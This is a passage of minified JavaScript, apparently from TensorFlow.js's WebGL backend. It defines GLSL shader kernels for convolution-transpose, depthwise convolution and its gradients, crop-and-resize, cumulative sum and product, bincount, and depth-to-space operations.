${t.outWidth}.0 ||\n                  fract(dyC) > 0.0) {\n                continue;\n              }\n              int idyC = int(dyC);\n\n              int wCPerm = ${o} - 1 - wC;\n\n              for (int d2 = 0; d2 < ${t.outChannels}; d2++) {\n                float xValue = getDy(batch, idyF, idyR, idyC, d2);\n                float wValue = getW(wFPerm, wRPerm, wCPerm, d1, d2);\n                dotProd += xValue * wValue;\n              }\n            }\n          }\n        }\n        setOutput(dotProd);\n      }\n    `
        }
    }
    const bP = {
        kernelName: uu,
        backendName: "webgl",
        kernelFunc: function gP(n) {
            const {inputs: t, backend: e, attrs: s} = n
              , {x: o, dy: r} = t
              , {strides: i, pad: a, dataFormat: c, dimRoundingMode: l, filterShape: u} = s
              , d = os(c)
              , h = ye(o.shape, u, i, 1, a, l, !1, d)
              , p = new hP(h);
            return e.runWebGLProgram(p, [o, r], "float32")
        }
    };
    class xP {
        constructor(t) {
            this.variableNames = ["dy", "W"],
            this.packedInputs = !0,
            this.packedOutput = !0,
            this.customUniforms = [{
                name: "strides",
                type: "vec2"
            }],
            this.outputShape = t.inShape,
            this.enableShapeUniforms = Ne(this.outputShape.length);
            const e = t.filterHeight
              , s = t.filterWidth
              , o = e - 1 - t.padInfo.top
              , r = s - 1 - t.padInfo.left;
            this.userCode = `\n      const ivec2 pads = ivec2(${o}, ${r});\n\n      void main() {\n        ivec4 coords = getOutputCoords();\n        int batch = coords[0];\n        int d1 = coords[3];\n\n        ivec2 dyCorner = ivec2(coords[1], coords[2]) - pads;\n        int dyRCorner = dyCorner.x;\n        int dyCCorner = dyCorner.y;\n\n        vec4 result = vec4(0.);\n        for (int wR = 0; wR < ${e}; wR++) {\n          float dyR = float(dyRCorner + wR) / strides[0];\n          if (dyR < 0.0 || dyR >= ${t.outHeight}.0 || fract(dyR) > 0.0) {\n            continue;\n          }\n          int idyR = int(dyR);\n          int wRPerm = ${e} - 1 - wR;\n\n          for (int wC = 0; wC < ${s}; wC++) {\n            int wCPerm = ${s} - 1 - wC;\n\n            float dyC = float(dyCCorner + wC) / strides[1];\n            bool idyCVal = (dyC >= 0.0) && (dyC < ${t.outWidth}.0)\n              && (fract(dyC) == 0.0);\n            int idyC = int(dyC);\n\n            float dyC2 = float(dyCCorner + wC + 1) / strides[1];\n            bool idyCVal2 = (dyC2 >= 0.0) && (dyC2 < ${t.outWidth}.0)\n              && (fract(dyC2) == 0.0);\n            int idyC2 = int(dyC2);\n\n            if (idyCVal && idyCVal2) {\n              for (int d2 = 0; d2 < ${t.outChannels}; d2 += 2) {\n                vec4 wValue = getW(wRPerm, wCPerm, d1, d2);\n                vec4 dySample = getDy(batch, idyR, idyC, d2);\n                vec4 dySample2 = (idyC / 2 == idyC2 / 2) ?\n                  dySample : getDy(batch, idyR, idyC2, d2);\n\n                vec2 dyValue = mod(float(idyC), 2.) == 0. ?\n                  dySample.xy : dySample.zw;\n                result.xy += vec2(dot(dyValue, wValue.xy),\n                  dot(dyValue, wValue.zw));\n\n                dyValue = mod(float(idyC2), 2.) == 0. ?\n                  dySample2.xy : dySample2.zw;\n                result.zw += vec2(dot(dyValue, wValue.xy),\n                  dot(dyValue, wValue.zw));\n              }\n            } else if (idyCVal) {\n              for (int d2 = 0; d2 < ${t.outChannels}; d2 += 2) {\n                vec4 wValue = getW(wRPerm, wCPerm, d1, d2);\n                vec4 dySample = getDy(batch, idyR, idyC, d2);\n                vec2 dyValue = mod(float(idyC), 2.) == 0. ?\n                  dySample.xy : dySample.zw;\n                result.xy += vec2(dot(dyValue, wValue.xy),\n                  dot(dyValue, wValue.zw));\n              }\n            } else if (idyCVal2) {\n              for (int d2 = 0; d2 < ${t.outChannels}; d2 += 2) {\n                vec4 wValue = getW(wRPerm, wCPerm, d1, d2);\n                vec4 dySample = getDy(batch, idyR, idyC2, d2);\n                vec2 dyValue = mod(float(idyC2), 2.) == 0. ?\n                  dySample.xy : dySample.zw;\n                result.zw += vec2(dot(dyValue, wValue.xy),\n                  dot(dyValue, wValue.zw));\n              }\n            }\n          }\n        }\n        setOutput(result);\n      }\n    `
        }
    }
    const IP = {
        kernelName: $a,
        backendName: "webgl",
        kernelFunc: function yP(n) {
            const {inputs: t, backend: e, attrs: s} = n
              , {dy: o, filter: r} = t
              , {inputShape: i, strides: a, pad: c, dataFormat: l, dimRoundingMode: u} = s
              , d = os(l)
              , h = ye(i, r.shape, a, 1, c, u, !1, d);
            if (z().getBool("WEBGL_PACK_CONV2DTRANSPOSE") && "channelsLast" === d) {
                const p = [[h.strideHeight, h.strideWidth]]
                  , f = new xP(h);
                return e.runWebGLProgram(f, [o, r], "float32", p)
            }
            {
                const p = new pP(h);
                return e.runWebGLProgram(p, [o, r], "float32")
            }
        }
    };
    const CP = {
        kernelName: Ga,
        backendName: "webgl",
        kernelFunc: function wP(n) {
            const {inputs: t, backend: e, attrs: s} = n
              , {x: o, filter: r} = t
              , {strides: i, pad: a, dilations: c} = s
              , l = ws(o.shape, r.shape, i, c, a)
              , u = new cP(l);
            return e.runWebGLProgram(u, [o, r], "float32")
        }
    };
    const SP = {
        kernelName: du,
        backendName: "webgl",
        kernelFunc: function vP(n) {
            const {inputs: t, backend: e, attrs: s} = n
              , {x: o, dy: r} = t
              , {strides: i, pad: a, filterShape: c} = s
              , l = ws(o.shape, c, i, 1, a)
              , u = new fP(l);
            return e.runWebGLProgram(u, [o, r], "float32")
        }
    };
    const TP = {
        kernelName: hu,
        backendName: "webgl",
        kernelFunc: function kP(n) {
            const {inputs: t, backend: e, attrs: s} = n
              , {dy: o, filter: r} = t
              , {pad: i, strides: a, inputShape: c} = s
              , l = ws(c, r.shape, a, 1, i)
              , u = new mP(l);
            return e.runWebGLProgram(u, [o, r], "float32")
        }
    }
      , $P = Tt({
        opSnippet: br + "\n  return cos(x);\n",
        packedOpSnippet: `\n  vec4 result = cos(x);\n  bvec4 isNaN = isnan(x);\n  ${To}\n  return result;\n`
    })
      , GP = {
        kernelName: Dr,
        backendName: "webgl",
        kernelFunc: $P
    }
      , LP = Tt({
        opSnippet: "\n  float e2x = exp(-x);\n  return (e2x + 1.0 / e2x) / 2.0;\n"
    })
      , EP = {
        kernelName: Wr,
        backendName: "webgl",
        kernelFunc: LP
    };
    class DP {
        constructor(t, e, s, o, r) {
            this.variableNames = ["Image", "Boxes", "BoxInd"],
            this.outputShape = [];
            const [i,a,c,l] = t
              , [u] = e
              , [d,h] = s;
            this.outputShape = [u, d, h, l];
            const p = "bilinear" === o ? 1 : 0
              , [f,m] = [a - 1 + ".0", c - 1 + ".0"]
              , [g,b,x] = d > 1 ? ["" + (a - 1) / (d - 1), "(y2-y1) * height_ratio", `y1*${f} + float(y)*(height_scale)`] : ["0.0", "0.0", `0.5 * (y1+y2) * ${f}`]
              , [I,y,w] = h > 1 ? ["" + (c - 1) / (h - 1), "(x2-x1) * width_ratio", `x1*${m} + float(x)*(width_scale)`] : ["0.0", "0.0", `0.5 * (x1+x2) * ${m}`];
            this.userCode = `\n      const float height_ratio = float(${g});\n      const float width_ratio = float(${I});\n      void main() {\n        ivec4 coords = getOutputCoords();\n        int b = coords[0];\n        int y = coords[1];\n        int x = coords[2];\n        int d = coords[3];\n\n        // get box vals\n        float y1 = getBoxes(b,0);\n        float x1 = getBoxes(b,1);\n        float y2 = getBoxes(b,2);\n        float x2 = getBoxes(b,3);\n\n        // get image in batch index\n        int bInd = round(getBoxInd(b));\n        if(bInd < 0 || bInd >= ${i}) {\n          return;\n        }\n\n        float height_scale = ${b};\n        float width_scale = ${y};\n\n        float in_y = ${x};\n        if( in_y < 0.0 || in_y > ${f} ) {\n          setOutput(float(${r}));\n          return;\n        }\n        float in_x = ${w};\n        if( in_x < 0.0 || in_x > ${m} ) {\n          setOutput(float(${r}));\n          return;\n        }\n\n        vec2 sourceFracIndexCR = vec2(in_x,in_y);\n        if(${p} == 1) {\n          // Compute the four integer indices.\n          ivec2 sourceFloorCR = ivec2(sourceFracIndexCR);\n          ivec2 sourceCeilCR = ivec2(ceil(sourceFracIndexCR));\n\n          float topLeft = getImage(b, sourceFloorCR.y, sourceFloorCR.x, d);\n          float bottomLeft = getImage(b, sourceCeilCR.y, sourceFloorCR.x, d);\n          float topRight = getImage(b, sourceFloorCR.y, sourceCeilCR.x, d);\n          float bottomRight = getImage(b, sourceCeilCR.y, sourceCeilCR.x, d);\n\n          vec2 fracCR = sourceFracIndexCR - vec2(sourceFloorCR);\n\n          float top = topLeft + (topRight - topLeft) * fracCR.x;\n          float bottom = bottomLeft + (bottomRight - bottomLeft) * fracCR.x;\n          float newValue = top + (bottom - top) * fracCR.y;\n          setOutput(newValue);\n        } else {\n          // Compute the coordinators of nearest neighbor point.\n          ivec2 sourceNearestCR = ivec2(floor(\n            sourceFracIndexCR + vec2(0.5,0.5)));\n          float newValue = getImage(b, sourceNearestCR.y, sourceNearestCR.x, d);\n          setOutput(newValue);\n        }\n      }\n    `
        }
    }
    const WP = {
        kernelName: fu,
        backendName: "webgl",
        kernelFunc: n=>{
            const {inputs: t, backend: e, attrs: s} = n
              , {image: o, boxes: r, boxInd: i} = t
              , {cropSize: a, method: c, extrapolationValue: l} = s
              , u = new DP(o.shape,r.shape,a,c,l);
            return e.runWebGLProgram(u, [o, r, i], "float32")
        }
    };
    var da;
    !function(n) {
        n.Prod = "*",
        n.Sum = "+"
    }(da || (da = {}));
    class tI {
        constructor(t, e, s, o) {
            this.op = t,
            this.outputShape = e,
            this.variableNames = ["x"],
            this.customUniforms = [{
                name: "index",
                type: "float"
            }];
            const r = this.outputShape.length
              , i = this.op === da.Prod ? "1.0" : "0.0"
              , a = s ? i : `getX(${eI(r, "coords", this.op)})`
              , c = this.outputShape[this.outputShape.length - 1];
            let l = ""
              , u = "";
            s ? (l = o ? "end != " + (c - 1) : "end != 0",
            u = o ? "end + 1" : "end - 1") : (l = o ? `end + pow2 < ${c}` : "end >= pow2",
            u = o ? "end + pow2" : "end - pow2"),
            this.userCode = `\n      void main() {\n        ${Wt(r)} coords = getOutputCoords();\n        int end = ${nI(r, "coords", this.op)};\n        float val = ${a};\n        int pow2 = int(pow(2.0, index));\n        if (${l}) {\n          int idx = ${u};\n          ${nI(r, "coords", this.op)} = idx;\n          val ${this.op}= getX(${eI(r, "coords", this.op)});\n        }\n        setOutput(val);\n      }\n    `
        }
    }
    function eI(n, t, e) {
        if (1 === n)
            return `${t}`;
        if (2 === n)
            return `${t}.x, ${t}.y`;
        if (3 === n)
            return `${t}.x, ${t}.y, ${t}.z`;
        if (4 === n)
            return `${t}.x, ${t}.y, ${t}.z, ${t}.w`;
        throw new Error(`Cumulative ${e} for rank ${n} is not yet supported`)
    }
    function nI(n, t, e) {
        if (1 === n)
            return `${t}`;
        if (2 === n)
            return `${t}.y`;
        if (3 === n)
            return `${t}.z`;
        if (4 === n)
            return `${t}.w`;
        throw new Error(`Cumulative ${e} for rank ${n} is not yet supported`)
    }
    function sI(n, t, e, s, o, r) {
        const i = t.shape.length
          , a = Yt([s], i);
        let c = t;
        null != a && (c = Me({
            inputs: {
                x: t
            },
            backend: e,
            attrs: {
                perm: a
            }
        }));
        const l = ee(1, i)[0];
        if (l !== i - 1)
            throw new Error(`WebGL cumprod shader expects an inner-most axis=${t.shape.length - 1} but got axis=${s}`);
        const u = c.shape[l];
        let d = Je({
            inputs: {
                x: c
            },
            backend: e
        });
        for (let h = 0; h <= Math.ceil(Math.log2(u)) - 1; h++) {
            const p = new tI(n,c.shape,!1,r)
              , f = [[h]]
              , m = d;
            d = e.runWebGLProgram(p, [d], d.dtype, f),
            e.disposeIntermediateTensorInfo(m)
        }
        if (o) {
            const h = new tI(n,c.shape,o,r)
              , p = d;
            d = e.runWebGLProgram(h, [d], d.dtype),
            e.disposeIntermediateTensorInfo(p)
        }
        if (null != a) {
            const p = Me({
                inputs: {
                    x: d
                },
                backend: e,
                attrs: {
                    perm: Cs(a)
                }
            });
            return e.disposeIntermediateTensorInfo(d),
            e.disposeIntermediateTensorInfo(c),
            p
        }
        return d
    }
    const VP = {
        kernelName: pu,
        backendName: "webgl",
        kernelFunc: function MP(n) {
            const {inputs: t, backend: e, attrs: s} = n
              , {x: o} = t
              , {axis: r, exclusive: i, reverse: a} = s;
            return sI(da.Prod, o, e, r, i, a)
        }
    };
    const zP = {
        kernelName: La,
        backendName: "webgl",
        kernelFunc: function FP(n) {
            const {inputs: t, backend: e, attrs: s} = n
              , {x: o} = t
              , {axis: r, exclusive: i, reverse: a} = s;
            return sI(da.Sum, o, e, r, i, a)
        }
    };
    const AP = {
        kernelName: mu,
        backendName: "webgl",
        kernelFunc: function XP(n) {
            const {inputs: t, backend: e, attrs: s} = n
              , {x: o, weights: r} = t
              , {size: i, binaryOutput: a} = s;
            if (1 === o.shape.length) {
                const c = e.readSync(o.dataId)
                  , l = e.readSync(r.dataId)
                  , u = C1(c, l, r.dtype, r.shape, i);
                return e.makeTensorInfo([i], r.dtype, u)
            }
            if (2 === o.shape.length) {
                const c = e.bufferSync(o)
                  , l = e.bufferSync(r)
                  , u = UF(c, l, i, a);
                return e.makeTensorInfo(u.shape, r.dtype, u.values)
            }
            throw new Error(`Error in denseBincount: input must be at most rank 2, but got rank${o.shape.length}.`)
        }
    };
    class PP {
        constructor(t, e, s) {
            this.variableNames = ["x"],
            this.outputShape = [],
            this.outputShape = t,
            this.blockSize = e,
            this.dataFormat = s,
            this.userCode = `\n    void main() {\n      ivec4 coords = getOutputCoords();\n      int b = coords[0];\n      int h = ${this.getHeightCoordString()};\n      int w = ${this.getWidthCoordString()};\n      int d = ${this.getDepthCoordString()};\n\n      int in_h = h / ${e};\n      int offset_h = imod(h, ${e});\n      int in_w = w / ${e};\n      int offset_w = imod(w, ${e});\n      int offset_d = (offset_h * ${e} + offset_w) *\n        ${this.getOutputDepthSize()};\n      int in_d = d + offset_d;\n\n      float result = ${this.getInputSamplingString()};\n      setOutput(result);\n    }\n  `
        }
        getHeightCoordString() {
            return "NHWC" === this.dataFormat ? "coords[1]" : "coords[2]"
        }
        getWidthCoordString() {
            return "NHWC" === this.dataFormat ? "coords[2]" : "coords[3]"
        }
        getDepthCoordString() {
            return "NHWC" === this.dataFormat ? "coords[3]" : "coords[1]"
        }
        getOutputDepthSize() {
            return "NHWC" === this.dataFormat ? this.outputShape[3] : this.outputShape[1]
        }
        getInputSamplingString() {
            return "NHWC" === this.dataFormat ? "getX(b, in_h, in_w, in_d)" : "getX(b, in_d, in_h, in_w)"
        }
    }
    const KP = {
        kernelName: gu,
        backendName: "webgl",
        kernelFunc: function OP(n) {
            const {inputs: t, backend: e, attrs: s} = n
              , {x: o} = t
              , {blockSize: r, dataFormat: i} = s
              , a = o.shape[0]
              , d = ("NHWC" === i ? o.shape[1] : o.shape[2]) * r
              , h = ("NHWC" === i ? o.shape[2] : o.shape[3]) * r
              , p = ("NHWC" === i ? o.shape[3] : o.shape[1]) / (r * r)
              , m = new PP("NHWC" === i ? [a, d, h, p] : [a, p, d, h],r,i);
            return e.runWebGLProgram(m, [o], o.dtype)
        }
    };
    class oI {
        constructor(t, e=!1, s=null, o=!1, r=!1) {
            this.variableNames = ["x", "W"],
            this.customUniforms = [{
                name: "pads",
                type: "ivec2"
            }, {
                name: "strides",
                type: "ivec2"
            }, {
                name: "dilations",
                type: "ivec2"
            }, {
                name: "inDims",
                type: "ivec2"
            }],
            this.outputShape = t.outShape,
            this.enableShapeUniforms = Ne(this.outputShape.length);
            const i = t.filterHeight
              , a = t.filterWidth
              , c = t.outChannels / t.inChannels;
            let l = ""
              , u = "";
            s && (l = o ? `float activation(float a) {\n          float b = getPreluActivationWeightsAtOutCoords();\n          ${s}\n        }` : r ? `float activation(float a) {\n          float b = getLeakyreluAlphaAtOutCoords();\n          ${s}\n        }` : `\n          float activation(float x) {\n            ${s}\n          }\n        `,
            u = "result = activation(result);");
            const d = e ? "result += getBiasAtOutCoords();" : "";
            e && this.variableNames.push("bias"),
            o && this.variableNames.push("preluActivationWeights"),
            r && this.variableNames.push("leakyreluAlpha"),
            this.userCode = `\n      ${l}\n\n      void main() {\n        ivec4 coords = getOutputCoords();\n        int batch = coords.x;\n        ivec2 xRCCorner = coords.yz * strides - pads;\n        int d2 = coords.w;\n        int d1 = d2 / ${c};\n        int q = d2 - d1 * ${c};\n\n        int xRCorner = xRCCorner.x;\n        int xCCorner = xRCCorner.y;\n\n        // Convolve x(?, ?, d1) with w(:, :, d1, q) to get y(yR, yC, d2).\n        // ? = to be determined. : = across all values in that axis.\n        float dotProd = 0.0;\n        // TO DO(dsmilkov): Flatten the two for loops and vec4 the operations.\n        for (int wR = 0; wR < ${i}; wR++) {\n          int xR = xRCorner + wR * dilations[0];\n\n          if (xR < 0 || xR >= inDims[0]) {\n            continue;\n          }\n\n          for (int wC = 0; wC < ${a}; wC++) {\n            int xC = xCCorner + wC * dilations[1];\n\n            if (xC < 0 || xC >= inDims[1]) {\n              continue;\n            }\n\n            float xVal = getX(batch, xR, xC, d1);\n            float wVal = getW(wR, wC, d1, q);\n            dotProd += xVal * wVal;\n          }\n        }\n\n        float result = dotProd;\n        ${d}\n        ${u}\n        setOutput(result);\n      }\n    `
        }
    }
    class rI {
        constructor(t, e=!1, s=null, o=!1, r=!1) {
            this.variableNames = ["x", "W"],
            this.packedInputs = !0,
            this.packedOutput = !0,
            this.customUniforms = [{
                name: "pads",
                type: "ivec2"
            }, {
                name: "strides",
                type: "ivec2"
            }, {
                name: "dilations",
                type: "ivec2"
            }, {
                name: "inDims",
                type: "ivec2"
            }],
            this.outputShape = t.outShape,
            this.enableShapeUniforms = Ne(this.outputShape.length);
            const i = t.outChannels / t.inChannels
              , a = t.padInfo.left
              , c = t.strideWidth
              , l = t.dilationWidth
              , u = t.filterHeight
              , d = t.filterWidth
              , h = d;
            let p = "\n      int xR; int xC; int xCOffset;\n      vec4 wTexel; vec4 previous; vec4 final;";
            for (let b = 0; b < d; b++)
                p += `\n          vec4 xTexelC${2 * b};\n          int xTexelC${2 * b}Ready;\n          vec4 xTexelC${2 * b + 1};\n          int xTexelC${2 * b + 1}Ready;\n          vec4 xC${b};`;
            p += `\n    for (int r = 0; r < ${u}; r++) {\n      `;
            for (let b = 0; b < d; b++)
                p += `\n          xTexelC${2 * b} = vec4(0.0);\n          xTexelC${2 * b}Ready = 0;\n          xTexelC${2 * b + 1} = vec4(0.0);\n          xTexelC${2 * b + 1}Ready = 0;\n          xC${b} = vec4(0.0);`;
            p += "\n        xR = xRCorner + r * dilations[0];\n        if (xR >=0 && xR < inDims[0]) {\n      ";
            for (let b = 0; b < (h + 1) / 2; b++) {
                const x = 2 * b;
                if (p += `\n          xC = xCCorner + ${x * l};\n          `,
                1 === c) {
                    if (x < d && (a % 2 == 1 ? (p += `\n                xCOffset = xC + 1;\n                if (xCOffset >= 0 && xCOffset < inDims[1] && xTexelC${x}Ready == 0) {\n                  xTexelC${x} = getX(batch, xR, xCOffset, d1);\n\n                  // Need to manually clear unused channels in case\n                  // we're reading from recycled texture.\n                  if (xCOffset + 1 >= inDims[1]) {\n                    xTexelC${x}.zw = vec2(0.0);\n                  }\n                  xTexelC${x}Ready = 1;\n                }\n              `,
                    p += 1 === l && x > 0 ? `\n                xC${x} = vec4(xTexelC${x - 2}.zw, xTexelC${x}.xy);\n                ` : `\n                  xCOffset = xC + 1 - 2;\n\n                  if (xCOffset >= 0 && xCOffset < inDims[1]) {\n                    previous = getX(batch, xR, xCOffset, d1);\n\n                    // Need to manually clear unused channels in case\n                    // we're reading from recycled texture.\n                    if (xCOffset + 1 >= inDims[1]) {\n                      previous.zw = vec2(0.0);\n                    }\n\n                    xC${x} = vec4(previous.zw, xTexelC${x}.xy);\n                  } else {\n                    xC${x} = vec4(0.0, 0.0, xTexelC${x}.xy);\n                  }\n                  `) : p += `\n                if (xC >= 0 && xC < inDims[1] && xTexelC${x}Ready == 0) {\n                  xTexelC${x} = getX(batch, xR, xC, d1);\n                  if (xC + 1 >= inDims[1]) {\n                    xTexelC${x}.zw = vec2(0.0);\n                  }\n                  xTexelC${x}Ready = 1;\n                }\n\n                xC${x} = xTexelC${x};\n                `,
                    x + 1 < d)) {
                        const I = a % 2 == 0 ? Bl(l) : l;
                        l % 2 == 0 && a % 2 == 1 || l % 2 != 0 && a % 2 != 1 ? (p += `\n                  xCOffset = xC + imod(pads[1], 2) + ${I};\n\n                  if (xCOffset >= 0 && xCOffset < inDims[1] && xTexelC${x + 1}Ready == 0) {\n                    xTexelC${x + 1} = getX(batch, xR, xCOffset, d1);\n\n                    // Need to manually clear unused channels in case\n                    // we're reading from recycled texture.\n                    if (xCOffset + 1 >= inDims[1]) {\n                      xTexelC${x + 1}.zw = vec2(0.0);\n                    }\n                    xTexelC${x + 1}Ready = 1;\n                  }\n                  `,
                        p += l > 1 ? `\n                    xCOffset -= 2;\n                    if (xCOffset >= 0 && xCOffset < inDims[1]) {\n                     previous = getX(batch, xR, xCOffset, d1);\n                     xC${x + 1} = vec4(previous.zw, xTexelC${x + 1}.xy);\n                    } else {\n                     xC${x + 1} = vec4(0.0, 0.0, xTexelC${x + 1}.xy);\n                    }\n                    ` : `\n                    xC${x + 1} = vec4(xTexelC${x}.zw, xTexelC${x + 1}.xy);\n                    `) : p += 1 === I ? `\n                    xC${x + 1} = xTexelC${x};\n                    ` : `\n                    xCOffset = xC + ${I};\n\n                    if (xCOffset >= 0 && xCOffset < inDims[1] && xTexelC${x + 1}Ready == 0) {\n                      xTexelC${x + 1} = getX(batch, xR, xCOffset, d1);\n                      if (xCOffset + 1 >= inDims[1]) {\n                        xTexelC${x + 1}.zw = vec2(0.0);\n                      }\n                      xTexelC${x + 1}Ready = 1;\n                    }\n\n                    xC${x + 1} = xTexelC${x + 1};\n                    `
                    }
                } else
                    x < d && (a % 2 == 1 ? (p += `\n                xCOffset = xC + 1 - strides[1];\n                if(xCOffset >= 0 && xCOffset < inDims[1] && xTexelC${x}Ready == 0) {\n                  xTexelC${x} = getX(batch, xR, xCOffset, d1);\n                  // Need to manually clear unused channels in case\n                  // we're reading from recycled texture.\n                  if (xCOffset + 1 >= inDims[1]) {\n                    xTexelC${x}.zw = vec2(0.0);\n                  }\n                  xTexelC${x}Ready = 1;\n                }\n\n                if(xC + 1 >= 0 && xC + 1 < inDims[1] && xTexelC${x + 1}Ready == 0) {\n                  xTexelC${x + 1} = getX(batch, xR, xC + 1, d1);\n                  // Need to manually clear unused channels in case\n                  // we're reading from recycled texture.\n                  if (xC + 2 >= inDims[1]) {\n                    xTexelC${x + 1}.zw = vec2(0.0);\n                  }\n                  xTexelC${x + 1}Ready = 1;\n                }\n\n                xC${x} = vec4(xTexelC${x}.zw, xTexelC${x + 1}.zw);\n              `,
                    x + 1 < d && (p += `\n                  final = vec4(0.0);\n                  xCOffset = xC + 1 + strides[1];\n                  if(xCOffset >= 0 && xCOffset < inDims[1]) {\n                    final = getX(batch, xR, xCOffset, d1);\n                  }\n                  xC${x + 1} = vec4(xTexelC${x + 1}.xy, final.xy);\n                `)) : (p += `\n                if(xC >= 0 && xC < inDims[1] && xTexelC${x}Ready == 0) {\n                  xTexelC${x} = getX(batch, xR, xC, d1);\n                  if (xC + 1 >= inDims[1]) {\n                    xTexelC${x}.zw = vec2(0.0);\n                  }\n                  xTexelC${x}Ready = 1;\n                }\n\n                xCOffset = xC + strides[1];\n                if(xCOffset >= 0 && xCOffset < inDims[1] && xTexelC${x + 1}Ready == 0) {\n                  xTexelC${x + 1} = getX(batch, xR, xCOffset, d1);\n                  if (xCOffset + 1 >= inDims[1]) {\n                    xTexelC${x + 1}.zw = vec2(0.);\n                  }\n                  xTexelC${x + 1}Ready = 1;\n                }\n\n                xC${x} = vec4(\n                  xTexelC${x}.xy, xTexelC${x + 1}.xy);\n              `,
                    x + 1 < d && (p += `\n                  xC${x + 1} = vec4(xTexelC${x}.zw, xTexelC${x + 1}.zw);\n                `)));
                x < d && (p += `\n            wTexel = getW(r, ${x}, d1, q);\n            dotProd += xC${x} * vec4(wTexel.xz, wTexel.xz);\n          `,
                x + 1 < d && (p += `\n              wTexel = getW(r, ${x + 1}, d1, q);\n              dotProd += xC${x + 1} * vec4(wTexel.xz, wTexel.xz);\n            `))
            }
            p += "\n    }\n  ",
            p += "\n      }\n    ";
            let f = ""
              , m = "";
            s && (f = o ? `vec4 activation(vec4 a) {\n          vec4 b = getPreluActivationWeightsAtOutCoords();\n          ${s}\n        }` : r ? `vec4 activation(vec4 a) {\n          vec4 b = getLeakyreluAlphaAtOutCoords();\n          ${s}\n        }` : `vec4 activation(vec4 x) {\n          ${s}\n        }`,
            m = "result = activation(result);");
            const g = e ? "result += getBiasAtOutCoords();" : "";
            e && this.variableNames.push("bias"),
            o && this.variableNames.push("preluActivationWeights"),
            r && this.variableNames.push("leakyreluAlpha"),
            this.userCode = `\n      ${f}\n\n      void main() {\n        ivec4 coords = getOutputCoords();\n        int batch = coords.x;\n        ivec2 xRCCorner = coords.yz * strides - pads;\n        int d2 = coords.w;\n        int d1 = d2 / ${i};\n        int q = d2 - d1 * ${i};\n        int xRCorner = xRCCorner.x;\n        int xCCorner = xRCCorner.y;\n\n        //intialize dotProd with a small epsilon seems to reduce GPU accuracy loss.\n        vec4 dotProd = vec4(0.000000000000001);\n\n        ${p}\n\n        vec4 result = dotProd - vec4(0.000000000000001);\n        ${g}\n        ${m}\n        setOutput(result);\n      }\n    `
        }
    }
    const BP = {
        kernelName: Ea,
        backendName: "webgl",
        kernelFunc: function ZP(n) {
            const {inputs: t, backend: e, attrs: s} = n
              , {x: o, filter: r} = t
              , {strides: i, pad: a, dilations: c, dimRoundingMode: l} = s;
            let u = c;
            null == u && (u = [1, 1]),
            v(Te(i, u), (()=>`Error in depthwiseConv2d: Either strides or dilations must be 1. Got strides ${i} and dilations '${u}'`));
            const d = ye(o.shape, r.shape, i, u, a, l, !0);
            let h;
            h = z().getBool("WEBGL_PACK_DEPTHWISECONV") && d.strideWidth <= 2 && d.outChannels / d.inChannels == 1 ? new rI(d) : new oI(d);
            const p = [[d.padInfo.top, d.padInfo.left], [d.strideHeight, d.strideWidth], [d.dilationHeight, d.dilationWidth], [d.inHeight, d.inWidth]];
            return e.runWebGLProgram(h, [o, r], "float32", p)
        }
    };
    class HP {
        constructor(t) {
            this.variableNames = ["x", "dy"],
            this.outputShape = t.filterShape;
            const e = t.strideHeight
              , s = t.strideWidth
              , o = t.padInfo.top
              , r = t.padInfo.left
              , i = t.outChannels / t.inChannels;
            this.userCode = `\n      void main() {\n        ivec4 coords = getOutputCoords();\n        int wR = coords.x;\n        int wC = coords.y;\n        int d1 = coords.z;\n        int dm = coords.w;\n        int d2 = d1 * ${i} + dm;\n\n        float dotProd = 0.0;\n\n        // TO DO: Vec4 over the batch size\n        for (int b = 0; b < ${t.batchSize}; b++) {\n          for (int yR = 0; yR < ${t.outHeight}; yR++) {\n            int xR = wR + yR * ${e} - ${o};\n\n            if (xR < 0 || xR >= ${t.inHeight}) {\n              continue;\n            }\n\n            for (int yC = 0; yC < ${t.outWidth}; yC++) {\n              int xC = wC + yC * ${s} - ${r};\n\n              if (xC < 0 || xC >= ${t.inWidth}) {\n                continue;\n              }\n\n              float dyValue = getDy(b, yR, yC, d2);\n              float xValue = getX(b, xR, xC, d1);\n              dotProd += (xValue * dyValue);\n            }\n          }\n        }\n        setOutput(dotProd);\n      }\n    `
        }
    }
    class _P {
        constructor(t) {
            this.variableNames = ["dy", "W"],
            this.outputShape = t.inShape;
            const e = t.filterHeight
              , s = t.filterWidth
              , o = t.strideHeight
              , r = t.strideWidth
              , i = e - 1 - t.padInfo.top
              , a = s - 1 - t.padInfo.left
              , c = t.outChannels / t.inChannels;
            this.userCode = `\n      const ivec2 pads = ivec2(${i}, ${a});\n\n      void main() {\n        ivec4 coords = getOutputCoords();\n        int batch = coords[0];\n        int d1 = coords[3];\n        ivec2 dyCorner = coords.yz - pads;\n        int dyRCorner = dyCorner.x;\n        int dyCCorner = dyCorner.y;\n\n        float dotProd = 0.0;\n\n        for (int wR = 0; wR < ${e}; wR++) {\n          float dyR = float(dyRCorner + wR) / ${o}.0;\n\n          if (dyR < 0.0 || dyR >= ${t.outHeight}.0 || fract(dyR) > 0.0) {\n            continue;\n          }\n          int idyR = int(dyR);\n\n          int wRPerm = ${e} - 1 - wR;\n\n          for (int wC = 0; wC < ${s}; wC++) {\n            float dyC = float(dyCCorner + wC) / ${r}.0;\n\n            if (dyC < 0.0 || dyC >= ${t.outWidth}.0 ||\n                fract(dyC) > 0.0) {\n              continue;\n            }\n            int idyC = int(dyC);\n\n            int wCPerm = ${s} - 1 - wC;\n\n            // TO DO: Vec4 over the channelMul\n            for (int dm = 0; dm < ${c}; dm++) {\n              int d2 = d1 * ${c} + dm;\n              float xValue = getDy(batch, idyR, idyC, d2);\n              float wValue = getW(wRPerm, wCPerm, d1, dm);\n              dotProd += xValue * wValue;\n            }\n          }\n        }\n        setOutput(dotProd);\n      }\n    `
        }
    }
    const YP = {
        kernelName: bu,
        backendName: "webgl",
        kernelFunc: function UP(n) {
            const {inputs: t, backend: e, attrs: s} = n
              , {x: o, dy: r} = t
              , {strides: i, dilations: a, pad: c, dimRoundingMode: l, filterShape: u} = s
              , d = ye(o.shape, u, i, a, c, l, !0)
              , h = new HP(d);
            return e.runWebGLProgram(h, [o, r], "float32")
        }
    };
    const JP = {
        kernelName: xu,
        backendName: "webgl",
        kernelFunc: function QP(n) {
            const {inputs: t, backend: e, attrs: s} = n
              , {dy: o, filter: r} = t
              , {strides: i, dilations: a, pad: c, dimRoundingMode: l, inputShape: u} = s
              , d = ye(u, r.shape, i, a, c, l, !0)
              , h = new _P(d);
            return e.runWebGLProgram(h, [o, r], "float32")
        }
    };
    class jP {
        constructor(t) {
